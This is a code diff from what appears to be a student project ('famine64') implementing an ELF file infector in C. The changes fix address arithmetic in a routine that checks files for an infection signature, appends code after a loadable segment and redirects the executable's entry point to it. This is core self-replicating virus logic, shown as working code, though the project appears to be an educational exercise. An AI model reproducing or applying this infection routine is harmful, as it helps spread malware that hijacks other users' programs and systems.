@@ -6,7 +6,7 @@
 /*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2019/08/24 20:26:06 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2019/09/12 15:55:44 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -234,8 +234,8 @@ void		pack_dat_elf(char *path, int size, char *data)
 		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++)
 		{
 			isection = section + i;
-			if (((Elf64_Ehdr *)data)->e_entry >= isection->sh_offset
-			&& ((Elf64_Ehdr *)data)->e_entry < isection->sh_offset + isection->sh_size)
+			if (((Elf64_Ehdr *)data)->e_entry >= isection->sh_addr
+			&& ((Elf64_Ehdr *)data)->e_entry < isection->sh_addr + isection->sh_size)
 			{
 				/* Find the PT_LOAD segment who contains the entry point */
 				for (size_t j = 0; j < ((Elf64_Ehdr *)data)->e_phnum; j++)
@@ -256,7 +256,7 @@ void		pack_dat_elf(char *path, int size, char *data)
 		return ;
 
 	/* 2. Check if file is already infected */
-	uint64_t	signature = *(uint64_t *)(data + ((Elf64_Ehdr *)data)->e_entry - sizeof(famine64_signature));
+	uint64_t	signature = *(uint64_t *)(data + ((Elf64_Ehdr *)data)->e_entry - iprogram->p_vaddr - sizeof(famine64_signature));
 	printf("file: %s signature: %#llX", path, signature);
 	if (signature == famine64_signature) {
 		printf(" -> Already infected\n");
@@ -274,10 +274,10 @@ void		pack_dat_elf(char *path, int size, char *data)
 		/* Where we write our code */
 	Elf64_Addr off = iprogram->p_offset + iprogram->p_filesz;
 		/* old entry point offset */
-	Elf64_Addr old_entry = (off - ((Elf64_Ehdr *)data)->e_entry - sizeof(famine64_signature)) * (-1);
+	Elf64_Addr old_entry = (off - (((Elf64_Ehdr *)data)->e_entry - iprogram->p_vaddr) + sizeof(famine64_signature)) * (-1);
 
 	/* 7. Change Elf Header entry point */
-	((Elf64_Ehdr *)data)->e_entry = off + sizeof(famine64_signature); // New entry point
+	((Elf64_Ehdr *)data)->e_entry = off + iprogram->p_vaddr + sizeof(famine64_signature); // New entry point
 	/* 8. Check if we have room to write our code */
 	/* Get the next segment */
 	Elf64_Phdr *next_ptload = NULL;
